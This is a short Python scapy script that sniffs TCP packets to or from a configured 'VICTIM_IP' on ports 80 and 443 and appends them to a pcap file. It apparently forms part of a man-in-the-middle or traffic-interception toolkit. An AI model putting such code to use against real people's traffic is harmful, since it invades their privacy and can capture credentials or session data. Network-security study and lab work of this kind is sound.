from scapy.all import *
import constants as c
import os
HTTP_PORT = [443,80]

def content(pkt):
	if pkt.haslayer(TCP) and (pkt.src == getmacbyip(c.VICTIM_IP) or pkt.dst == getmacbyip(c.VICTIM_IP)):
		if pkt[TCP].dport in HTTP_PORT:
			wrpcap("content.pcap",pkt,append=True)
def checkfile(filename):
	if os.path.exists(filename):
		clear = input("Do you want to reset the pcap (Y|N): \t")
		if clear.upper() == "Y":
			os.remove(filename)

def main():
	# filename = input("File name?\t")
	filename = "content.pcap"
	checkfile(filename)
	sniff(count=5,lfilter=content)

if __name__ == "__main__":
	main()
